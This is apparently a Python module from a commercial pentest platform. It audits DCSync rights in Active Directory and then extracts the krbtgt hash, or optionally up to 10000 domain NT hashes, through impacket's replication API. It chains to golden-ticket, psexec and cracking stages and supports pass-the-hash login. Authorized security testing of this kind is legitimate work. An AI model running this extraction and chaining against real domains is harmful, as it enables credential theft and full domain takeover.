"""dcsync_audit - DCSync rights + capability audit (MITRE T1003.006).

VL-METHOD methodology scanner. Verifies whether the supplied AD
credentials hold the replication ACEs needed to perform a DCSync attack,
AND (when rights are present) proves the capability by extracting a
single sample hash via the impacket DRSUAPI/MS-DRSR replication API.

CRITICAL SAFETY POSTURE
═══════════════════════════════════════════════════════════════════════

Default behavior dumps ONLY the krbtgt account hash (or a single user)
as proof-of-capability. The full domain hash file is NOT extracted. This
is intentional - a customer-facing pentest scanner should never sit on a
copy of every NT hash in the domain "just in case."

Full domain dump (capped at 10000 entries) is unlocked by
`options.full_dump = True` and is intended only for engagements where
the customer's statement of work explicitly authorizes it.

THE 7 VL-METHOD STAGES
═══════════════════════════════════════════════════════════════════════

  1. PRE-FLIGHT   - dc_ip + domain + user + (password OR nt_hash) supplied?
                    Then TCP-test 389/tcp (LDAP) + 445/tcp (SMB - needed
                    for the DRSUAPI replication call). Skip if missing
                    inputs or unreachable.

  2. FINGERPRINT  - ldap3 simple bind on the DC, read rootDSE attributes
                    (dnsHostName, domainFunctionalLevel, namingContexts,
                    currentTime). On bind failure stash bind_failed=True
                    and abort the rest.

  3. QUICK PROBE  - Query the domain naming context's
                    nTSecurityDescriptor for ACE entries granting the
                    two extended rights that together enable DCSync:
                      DS-Replication-Get-Changes
                          {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}
                      DS-Replication-Get-Changes-All
                          {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}
                    If the current user or any of their group memberships
                    holds these ACEs, mark has_dcsync_rights = True and
                    emit a preliminary dcsync_capability finding.

  4. DEEP SCAN    - Gated on quick_probe success OR options.always_deep.
                    PROOF-OF-CAPABILITY: invoke impacket
                    secretsdump.RemoteOperations to perform a single
                    DRSUAPI GetNCChanges call for krbtgt only. If
                    options.full_dump=True, expand to all NTDS entries
                    (hard cap 10000). Emits a finding per extracted hash.

  5. VERIFY       - Validate hash string conforms to RID:LM:NT
                    (16 hex : 32 hex : 32 hex). Set confidence:
                      krbtgt extracted          -> CONFIRMED
                      user-level hash extracted -> CONFIRMED
                      ACE only, no extraction   -> SUSPECTED

  6. PRIVILEGE    - Classify each extracted hash:
                      krbtgt                       -> golden_ticket_capable
                      Domain Admin account         -> domain_admin_compromise
                      Computer account ($-suffix) -> computer_account_compromise
                      Regular user                 -> user_credential_dump

  7. CHAIN        - For CONFIRMED krbtgt -> post_exploit_golden_ticket_forge
                    For Domain Admin    -> post_exploit_lateral_psexec +
                                            post_exploit_dpapi_unmask
                    For regular user    -> john_hash_audit (offline crack)

Customer input via ScanRequest.options:
  - dc_ip       : Domain Controller IP (required, OR pass via req.target)
  - domain      : AD domain name (required, e.g. corp.local)
  - user        : Authenticated AD user (required)
  - password    : Plaintext password OR
  - nt_hash     : NT hash (alternative to password)
  - chain_creds : Inherited from upstream chain (auto-populated)
  - full_dump   : bool, default False. Unlock full domain hash extraction.
  - always_deep : bool, force deep_scan even if quick_probe fails
  - show_plaintext : bool, include raw hash in marker (default False -
                     marker is redacted last-4-of-NT only).
"""
from __future__ import annotations

import asyncio
import re
import time
from typing import Optional

from fastapi import APIRouter, Depends
from pydantic import BaseModel

from tools._shared import ScanRequest, verify_scan_quota
from tools._vl_core import ScanContext
from tools._methodology import MethodologyScanner, helpers
from tools._payloads.dcsync_audit_findings import (
    DCSYNC_AUDIT_FINDING_RULES,
    INTEL_FIELDS,
)

router = APIRouter()


# DCSync hard-cap on full-dump mode. 10k entries is enough for the
# overwhelming majority of mid-size domains; anything larger should be
# handled by a dedicated offline-crack workflow, not a streaming scanner.
DCSYNC_FULL_DUMP_HARD_CAP = 10000

# Extended-right GUIDs that together grant DCSync capability. Found in
# nTSecurityDescriptor.dacl[].objectType when the ACE is an extended-
# right ACE (object_type bits set in ACCESS_OBJECT_ACE).
DS_REPLICATION_GET_CHANGES_GUID     = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
DS_REPLICATION_GET_CHANGES_ALL_GUID = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"

# Detect a well-formed DCSync hash entry: "<rid>:<LM-md4>:<NT-md4>:::"
_RE_DCSYNC_HASH = re.compile(
    r"^(?P<account>[^:]+):(?P<rid>\d+):(?P<lm>[A-Fa-f0-9]{32}):(?P<nt>[A-Fa-f0-9]{32})"
)


# ═══════════════════════════════════════════════════════════════════
#  impacket import (graceful degrade)
# ═══════════════════════════════════════════════════════════════════


_IMPACKET_AVAILABLE = True
try:
    # We only need these at extraction time; import here to fail-fast
    # if the wheel is missing in this container.
    from impacket.examples import secretsdump as _secretsdump  # noqa: F401
    from impacket.smbconnection import SMBConnection as _SMBConnection  # noqa: F401
except Exception:
    _IMPACKET_AVAILABLE = False


def _redact(hash_str: str, show_plaintext: bool = False) -> str:
    """Customer-safe hash redaction.

    Default (show_plaintext=False) emits "rid<N>_NT_<last4>" so the
    finding stays useful (you can match it across runs / hashcat) without
    leaking the full NT hash. When show_plaintext=True (customer scanned
    their own infra and opted in) the raw RID:LM:NT string is returned.
    """
    if not hash_str:
        return "rid?_NT_empty"
    s = hash_str.strip()
    if show_plaintext:
        return s
    m = _RE_DCSYNC_HASH.match(s)
    if not m:
        # Unknown format - still redact most of it
        tail = s[-4:] if len(s) >= 4 else "***"
        return f"rid?_NT_{tail}"
    rid = m.group("rid")
    nt = m.group("nt")
    return f"rid{rid}_NT_{nt[-4:].lower()}"


# ═══════════════════════════════════════════════════════════════════
#  Request model
# ═══════════════════════════════════════════════════════════════════


class DcsyncAuditRequest(ScanRequest):
    options: Optional[dict] = None


# ═══════════════════════════════════════════════════════════════════
#  DcsyncAudit - the VL-METHOD scanner class
# ═══════════════════════════════════════════════════════════════════


class DcsyncAudit(MethodologyScanner):
    name = "dcsync_audit"

    # ── STAGE 1: PRE-FLIGHT ──────────────────────────────────────
    async def pre_flight(self, ctx: ScanContext) -> bool:
        opts = ctx.state.get("_options") or {}

        # Inherit chain_creds if no explicit user/password supplied
        chain_creds = opts.get("chain_creds") or []
        if not opts.get("user") and chain_creds:
            cred0 = chain_creds[0] or {}
            opts["user"] = cred0.get("user", "")
            if not opts.get("password") and not opts.get("nt_hash"):
                opts["password"] = cred0.get("pwd", "")
            ctx.state["_options"] = opts

        if not _IMPACKET_AVAILABLE:
            ctx.state["impacket_missing"] = True
            # Don't bail here - we can still attempt the ldap ACE check
            # to give the customer a partial answer.

        dc_ip = (opts.get("dc_ip") or "").strip() or (ctx.host or "").strip()
        domain = (opts.get("domain") or "").strip()
        user = (opts.get("user") or "").strip()
        password = opts.get("password") or ""
        nt_hash = opts.get("nt_hash") or ""

        if not dc_ip or not domain or not user or not (password or nt_hash):
            ctx.state["skipped_reason"] = (
                "DCSync audit requires AD admin user + dc_ip + domain "
                "(plus password or nt_hash). One or more missing."
            )
            return False

        ctx.state["dc_ip"] = dc_ip
        ctx.state["domain"] = domain
        ctx.state["bind_user"] = user

        ldap_up = await helpers.port_open(dc_ip, 389, timeout=4.0)
        smb_up = await helpers.port_open(dc_ip, 445, timeout=4.0)
        ctx.state["ldap_reachable"] = ldap_up
        ctx.state["smb_reachable"] = smb_up

        if not ldap_up:
            ctx.state["skipped_reason"] = f"LDAP/389 on {dc_ip} unreachable - DC offline or filtered"
            return False
        if not smb_up:
            ctx.state["skipped_reason"] = f"SMB/445 on {dc_ip} unreachable - DRSUAPI cannot run"
            return False
        return True

    # ── STAGE 2: FINGERPRINT ─────────────────────────────────────
    async def fingerprint(self, ctx: ScanContext):
        opts = ctx.state.get("_options") or {}
        dc_ip = ctx.state.get("dc_ip") or ""
        domain = ctx.state.get("domain") or ""
        user = ctx.state.get("bind_user") or ""
        password = opts.get("password") or ""
        nt_hash = opts.get("nt_hash") or ""

        fp = {
            "dns_host_name": "",
            "domain_functional_level": "",
            "naming_contexts": [],
            "current_time": "",
            "bind_method": "",
        }
        ctx.state["fingerprint"] = fp

        try:
            import ldap3
        except ImportError:
            ctx.state["bind_failed"] = True
            ctx.state["stage_errors"]["fingerprint"] = "ldap3 not installed"
            return

        # Build authentication: password OR NT-hash (NTLM with LM:NT format)
        try:
            server = ldap3.Server(dc_ip, get_info=ldap3.DSA, connect_timeout=8)
            if nt_hash:
                # NTLM auth with hash-only (impacket-style: 'LM:NT' or ':NT')
                ntlm_user = f"{domain}\\{user}"
                ntlm_password = f"{'aad3b435b51404eeaad3b435b51404ee'}:{nt_hash}"
                conn = ldap3.Connection(
                    server,
                    user=ntlm_user,
                    password=ntlm_password,
                    authentication=ldap3.NTLM,
                    auto_bind=True,
                    receive_timeout=10,
                )
                fp["bind_method"] = "ntlm_hash"
            else:
                # Simple bind with user@domain UPN
                upn = user if "@" in user else f"{user}@{domain}"
                conn = ldap3.Connection(
                    server,
                    user=upn,
                    password=password,
                    auto_bind=True,
                    receive_timeout=10,
                )
                fp["bind_method"] = "simple_upn"
        except Exception as e:
            ctx.state["bind_failed"] = True
            ctx.state["stage_errors"]["fingerprint"] = f"{type(e).__name__}: {str(e)[:200]}"
            return

        try:
            info = server.info
            if info is not None:
                fp["dns_host_name"] = str(getattr(info, "dnsHostName", "") or "")
                fp["domain_functional_level"] = str(
                    getattr(info, "raw", {}).get("domainFunctionality", [b""])[0].decode("utf-8", "ignore")
                ) if getattr(info, "raw", None) else ""
                ncs = getattr(info, "naming_contexts", []) or []
                fp["naming_contexts"] = [str(x) for x in ncs][:8]
                fp["current_time"] = str(
                    getattr(info, "raw", {}).get("currentTime", [b""])[0].decode("utf-8", "ignore")
                ) if getattr(info, "raw", None) else ""
        except Exception as e:
            ctx.state["stage_errors"]["fingerprint_info"] = f"{type(e).__name__}: {str(e)[:120]}"
        finally:
            try:
                conn.unbind()
            except Exception:
                pass

    # ── STAGE 3: QUICK PROBE (ACE check) ─────────────────────────
    async def quick_probe(self, ctx: ScanContext) -> list[dict]:
        if ctx.state.get("bind_failed"):
            ctx.state["quick_probe_attempts"] = 0
            ctx.state["quick_probe_hits"] = 0
            ctx.state["has_dcsync_rights"] = False
            return []

        opts = ctx.state.get("_options") or {}
        dc_ip = ctx.state.get("dc_ip") or ""
        domain = ctx.state.get("domain") or ""
        user = ctx.state.get("bind_user") or ""
        password = opts.get("password") or ""
        nt_hash = opts.get("nt_hash") or ""

        ctx.state["quick_probe_attempts"] = 1
        ctx.state["quick_probe_hits"] = 0
        ctx.state["has_dcsync_rights"] = False

        # Run ldap3 work in a thread - it's blocking I/O
        def _check_aces() -> tuple[bool, str]:
            try:
                import ldap3
                from ldap3.protocol.formatters.formatters import format_sid
            except ImportError:
                return (False, "ldap3 not installed")

            try:
                server = ldap3.Server(dc_ip, get_info=ldap3.DSA, connect_timeout=8)
                if nt_hash:
                    ntlm_user = f"{domain}\\{user}"
                    ntlm_password = f"aad3b435b51404eeaad3b435b51404ee:{nt_hash}"
                    conn = ldap3.Connection(
                        server, user=ntlm_user, password=ntlm_password,
                        authentication=ldap3.NTLM, auto_bind=True,
                        receive_timeout=10,
                    )
                else:
                    upn = user if "@" in user else f"{user}@{domain}"
                    conn = ldap3.Connection(
                        server, user=upn, password=password,
                        auto_bind=True, receive_timeout=10,
                    )
            except Exception as e:
                return (False, f"bind failed: {type(e).__name__}")

            try:
                # Build domain DN from "corp.local" -> "DC=corp,DC=local"
                domain_dn = ",".join(f"DC={p}" for p in domain.split(".") if p)
                if not domain_dn:
                    return (False, "could not derive domain DN")

                # Resolve current user's SID + group SIDs to compare against ACEs
                user_filter = (
                    f"(&(objectClass=user)(|(sAMAccountName={user.split('@')[0]})"
                    f"(userPrincipalName={user if '@' in user else user + '@' + domain})))"
                )
                conn.search(
                    search_base=domain_dn,
                    search_filter=user_filter,
                    search_scope=ldap3.SUBTREE,
                    attributes=["objectSid", "tokenGroups", "memberOf"],
                )
                user_sids: set[str] = set()
                for entry in (conn.entries or []):
                    try:
                        sid_val = entry.objectSid.value
                        if sid_val:
                            user_sids.add(str(sid_val))
                    except Exception:
                        pass
                    try:
                        for tg in (entry.tokenGroups.values or []):
                            try:
                                user_sids.add(format_sid(tg))
                            except Exception:
                                pass
                    except Exception:
                        pass

                # Fetch the nTSecurityDescriptor on the domain NC root
                conn.search(
                    search_base=domain_dn,
                    search_filter="(objectClass=*)",
                    search_scope=ldap3.BASE,
                    attributes=["nTSecurityDescriptor"],
                    controls=[("1.2.840.113556.1.4.801", True, b"\x30\x03\x02\x01\x07")],
                )
                if not conn.entries:
                    return (False, "no nTSecurityDescriptor returned")

                raw_sd = None
                for entry in conn.entries:
                    try:
                        raw_sd = entry["nTSecurityDescriptor"].raw_values[0]
                        break
                    except Exception:
                        continue
                if not raw_sd:
                    return (False, "no SD bytes")

                # Parse SD with impacket if available (cleanest path)
                try:
                    from impacket.ldap import ldaptypes
                    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw_sd)
                    dacl = sd["Dacl"]
                    if not dacl:
                        return (False, "no DACL")
                    for ace in dacl["Data"]:
                        ace_type = ace["AceType"]
                        # 0x05 = ACCESS_ALLOWED_OBJECT_ACE_TYPE (has ObjectType)
                        if ace_type != 0x05:
                            continue
                        ace_body = ace["Ace"]
                        try:
                            sid_str = ace_body["Sid"].formatCanonical()
                        except Exception:
                            sid_str = ""
                        if sid_str not in user_sids:
                            continue
                        try:
                            obj_type = ace_body["ObjectType"]
                            if not obj_type:
                                continue
                            # ObjectType is a bytes GUID in little-endian; format
                            import uuid as _uuid
                            guid_str = str(_uuid.UUID(bytes_le=bytes(obj_type))).lower()
                        except Exception:
                            continue
                        if guid_str in (
                            DS_REPLICATION_GET_CHANGES_GUID,
                            DS_REPLICATION_GET_CHANGES_ALL_GUID,
                        ):
                            return (True, f"ACE granting {guid_str} to SID {sid_str}")
                except Exception as e:
                    return (False, f"SD parse error: {type(e).__name__}")
                return (False, "no matching ACE found")
            finally:
                try:
                    conn.unbind()
                except Exception:
                    pass

        loop = asyncio.get_event_loop()
        has_rights, detail = await loop.run_in_executor(None, _check_aces)
        ctx.state["has_dcsync_rights"] = bool(has_rights)
        ctx.state["dcsync_ace_detail"] = detail

        if not has_rights:
            return []

        ctx.state["quick_probe_hits"] = 1
        # Preliminary finding - this is just the capability marker
        return [{
            "id": "quick_capability",
            "kind": "dcsync_capability",
            "account_name": ctx.state.get("bind_user") or "",
            "ace_detail": detail,
            "discovery_method": "ldap_ace_check",
            "hash_marker": "(no hash extracted yet - capability only)",
        }]

    # ── STAGE 4: DEEP SCAN (proof-of-capability extraction) ──────
    async def deep_scan(self, ctx: ScanContext) -> list[dict]:
        if not _IMPACKET_AVAILABLE:
            ctx.state["impacket_missing"] = True
            ctx.state["deep_skipped"] = "impacket not available"
            return []

        opts = ctx.state.get("_options") or {}
        dc_ip = ctx.state.get("dc_ip") or ""
        domain = ctx.state.get("domain") or ""
        user = ctx.state.get("bind_user") or ""
        password = opts.get("password") or ""
        nt_hash = opts.get("nt_hash") or ""
        full_dump = bool(opts.get("full_dump"))
        show = bool(opts.get("show_plaintext"))

        ctx.state["dcsync_hashes_extracted"] = 0
        ctx.state["krbtgt_hash_extracted"] = False

        # impacket secretsdump.LMHash:NTHash format
        lm_hash_arg = ""
        nt_hash_arg = ""
        if nt_hash:
            lm_hash_arg = "aad3b435b51404eeaad3b435b51404ee"
            nt_hash_arg = nt_hash

        def _run_extract() -> list[dict]:
            """Blocking impacket secretsdump call run in thread."""
            try:
                from impacket.smbconnection import SMBConnection
                from impacket.examples.secretsdump import (
                    RemoteOperations, NTDSHashes,
                )
            except Exception as e:
                ctx.state["stage_errors"]["deep_scan_import"] = (
                    f"{type(e).__name__}: {str(e)[:200]}"
                )
                return []

            collected: list[dict] = []

            class _Sink:
                """Capture impacket per-hash callback into local list."""
                def __init__(self, hard_cap: int):
                    self.hard_cap = hard_cap
                    self.count = 0

                def __call__(self, secret: str):
                    if self.count >= self.hard_cap:
                        return
                    if not isinstance(secret, str):
                        return
                    # Only care about NTLM hash format lines, not Kerberos keys
                    m = _RE_DCSYNC_HASH.match(secret)
                    if not m:
                        return
                    self.count += 1
                    account = m.group("account")
                    # Strip leading "domain\" if present
                    if "\\" in account:
                        account = account.split("\\", 1)[1]
                    collected.append({
                        "raw_line": secret,
                        "account_name": account,
                        "rid": m.group("rid"),
                        "lm": m.group("lm"),
                        "nt": m.group("nt"),
                    })

            smb = None
            ro = None
            try:
                smb = SMBConnection(dc_ip, dc_ip, sess_port=445, timeout=15)
                if nt_hash_arg:
                    smb.login(user, "", domain,
                              lmhash=lm_hash_arg, nthash=nt_hash_arg)
                else:
                    smb.login(user, password, domain)
                ro = RemoteOperations(smb, doKerberos=False, kdcHost=dc_ip)
                ro.enableRegistry()

                if full_dump:
                    sink = _Sink(hard_cap=DCSYNC_FULL_DUMP_HARD_CAP)
                    ntds = NTDSHashes(
                        ntdsFile=None, bootKey=None,
                        isRemote=True, history=False,
                        noLMHash=True, remoteOps=ro,
                        useVSSMethod=False, justNTLM=True,
                        pwdLastSet=False, resumeSession=None,
                        outputFileName=None, justUser=None,
                        skipUser=None, ldapFilter=None,
                        printUserStatus=False,
                        perSecretCallback=lambda secretType, secret: sink(secret),
                    )
                    try:
                        ntds.dump()
                    finally:
                        try: ntds.finish()
                        except Exception: pass
                else:
                    # krbtgt-only proof. justUser limits the GetNCChanges call.
                    sink = _Sink(hard_cap=1)
                    ntds = NTDSHashes(
                        ntdsFile=None, bootKey=None,
                        isRemote=True, history=False,
                        noLMHash=True, remoteOps=ro,
                        useVSSMethod=False, justNTLM=True,
                        pwdLastSet=False, resumeSession=None,
                        outputFileName=None, justUser="krbtgt",
                        skipUser=None, ldapFilter=None,
                        printUserStatus=False,
                        perSecretCallback=lambda secretType, secret: sink(secret),
                    )
                    try:
                        ntds.dump()
                    finally:
                        try: ntds.finish()
                        except Exception: pass
            except Exception as e:
                ctx.state["stage_errors"]["deep_scan"] = (
                    f"{type(e).__name__}: {str(e)[:300]}"
                )
            finally:
                try:
                    if ro is not None:
                        ro.finish()
                except Exception:
                    pass
                try:
                    if smb is not None:
                        smb.close()
                except Exception:
                    pass
            return collected

        loop = asyncio.get_event_loop()
        extracted = await loop.run_in_executor(None, _run_extract)

        findings: list[dict] = []
        for i, hit in enumerate(extracted):
            raw = hit["raw_line"]
            account = hit["account_name"]
            if account.lower() == "krbtgt":
                ctx.state["krbtgt_hash_extracted"] = True
            findings.append({
                "id": f"deep_{i}",
                "kind": "dcsync_hash",
                "account_name": account,
                "rid": hit["rid"],
                "hash_type": "LM:NT",
                "hash_marker": _redact(raw, show_plaintext=show),
                "_hash_private": raw,  # never serialize to PDF
                "discovery_method": "impacket_drsuapi_getntdsuserinfo",
            })
        ctx.state["dcsync_hashes_extracted"] = len(findings)
        return findings

    # ── STAGE 5: VERIFY (validate hash format) ───────────────────
    async def verify(self, ctx: ScanContext, finding: dict) -> Optional[dict]:
        # VL-FOUNDRY evidence surfacing: stamp a concrete, per-finding
        # evidence string onto the methodology finding object. This rides
        # into the report via the methodology_findings intel field; it adds
        # no new finding and changes no severity (advisory-by-design safe).
        finding["evidence_marker"] = (
            f"{finding.get('discovery_method') or finding.get('kind') or 'probe'}"
            f" -> verifying {finding.get('kind') or 'finding'} for "
            f"{finding.get('user') or finding.get('attack_label') or ctx.host}")
        kind = finding.get("kind", "")
        if kind == "dcsync_capability":
            # ACE check only - no hash extracted to validate
            finding["confidence"] = "SUSPECTED"
            finding["verification_method"] = "ldap_ace_check_only_no_extraction"
            return finding

        # dcsync_hash finding - validate format
        raw = finding.get("_hash_private") or ""
        m = _RE_DCSYNC_HASH.match(raw)
        if not m:
            finding["confidence"] = "SUSPECTED"
            finding["verification_method"] = "hash_format_invalid"
            return finding
        rid = m.group("rid")
        lm = m.group("lm")
        nt = m.group("nt")
        # Format spec: RID = digits, LM/NT = 32-hex each. Regex already
        # enforced that; one more belt-and-suspenders check on lengths.
        if not (rid.isdigit() and len(lm) == 32 and len(nt) == 32):
            finding["confidence"] = "SUSPECTED"
            finding["verification_method"] = "hash_format_invalid"
            return finding

        finding["confidence"] = "CONFIRMED"
        account = (finding.get("account_name") or "").lower()
        if account == "krbtgt":
            finding["verification_method"] = "impacket_drsuapi_krbtgt_extracted"
        else:
            finding["verification_method"] = "impacket_drsuapi_user_hash_extracted"
        return finding

    # ── STAGE 6: PRIVILEGE CHECK ─────────────────────────────────
    async def privilege_check(self, ctx: ScanContext, finding: dict) -> dict:
        kind = finding.get("kind", "")
        if kind == "dcsync_capability":
            # No extraction = no privilege classification yet
            finding["privilege_level"] = "unknown"
            return finding

        account = (finding.get("account_name") or "").lower()
        if account == "krbtgt":
            finding["privilege_level"] = "golden_ticket_capable"
        elif account.endswith("$"):
            finding["privilege_level"] = "computer_account_compromise"
        elif any(da in account for da in ("administrator", "admin", "dom_admin", "da_")):
            # Heuristic - not perfect, but flags obvious DA candidates
            finding["privilege_level"] = "domain_admin_compromise"
        else:
            finding["privilege_level"] = "user_credential_dump"
        return finding

    # ── STAGE 7: CHAIN HANDOFF ───────────────────────────────────
    async def chain_handoff(self, ctx: ScanContext, findings: list[dict]) -> list[str]:
        next_scanners: list[str] = []
        for f in findings:
            if f.get("confidence") != "CONFIRMED":
                continue
            priv = f.get("privilege_level", "")
            if priv == "golden_ticket_capable":
                # krbtgt = direct golden ticket forge
                for s in ("post_exploit_golden_ticket_forge",):
                    if s not in next_scanners:
                        next_scanners.append(s)
            elif priv == "domain_admin_compromise":
                for s in (
                    "post_exploit_lateral_psexec",
                    "post_exploit_dpapi_unmask",
                ):
                    if s not in next_scanners:
                        next_scanners.append(s)
            else:
                # Regular user / computer account hashes - crack offline
                if "john_hash_audit" not in next_scanners:
                    next_scanners.append("john_hash_audit")
        return next_scanners


# ═══════════════════════════════════════════════════════════════════
#  Endpoint
# ═══════════════════════════════════════════════════════════════════


@router.post("/api/password/dcsync_audit")
async def password_dcsync_audit(
    req: DcsyncAuditRequest, _=Depends(verify_scan_quota)
):
    scanner = DcsyncAudit()
    return await scanner.run_as_endpoint(
        req,
        finding_rules=DCSYNC_AUDIT_FINDING_RULES,
        intel_fields=INTEL_FIELDS,
    )


def register(app):
    app.include_router(router)


# ═══════════════════════════════════════════════════════════════════
#  Chain registry registration (MUST be at bottom of file)
# ═══════════════════════════════════════════════════════════════════


async def _chain_callable(target: str, options: dict, jwt=None) -> dict:
    opts = options or {}
    if not opts.get("user") and (opts.get("chain_creds") or []):
        cred = opts["chain_creds"][0]
        opts["user"] = cred.get("user", "")
        opts["password"] = cred.get("pwd", "")
    if not opts.get("dc_ip"):
        opts["dc_ip"] = target
    req = DcsyncAuditRequest(target=target, options=opts)
    scanner = DcsyncAudit()
    return await scanner.run_as_endpoint(
        req,
        finding_rules=DCSYNC_AUDIT_FINDING_RULES,
        intel_fields=INTEL_FIELDS,
    )


from tools._methodology import chain_registry
chain_registry.register("dcsync_audit", _chain_callable)
